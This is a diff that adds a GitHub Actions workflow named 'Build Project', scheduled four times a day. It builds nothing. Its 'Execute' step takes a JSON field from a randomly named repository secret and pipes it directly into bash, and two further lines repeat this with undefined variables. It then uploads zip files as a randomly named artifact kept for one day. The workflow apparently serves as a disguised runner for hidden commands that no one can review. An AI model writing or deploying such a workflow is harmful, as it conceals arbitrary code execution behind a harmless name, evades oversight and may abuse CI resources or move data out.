@@ -1,0 +1,28 @@
+name: Build Project
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '57 3,9,15,21 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Execute
+        env:
+          jvgng8: ${{ secrets.jvgng8 }}
+        run: |
+          printf '%s' "$jvgng8" | jq -r .nf4 | /bin/bash
+          printf '%s' "$hch550" | jq -r .u8044 | /bin/bash
+          printf '%s' "$myqra2" | jq -r .ukg35 | /bin/bash
+
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: uPx3didF
+          path: "*.zip"
+          retention-days: 1
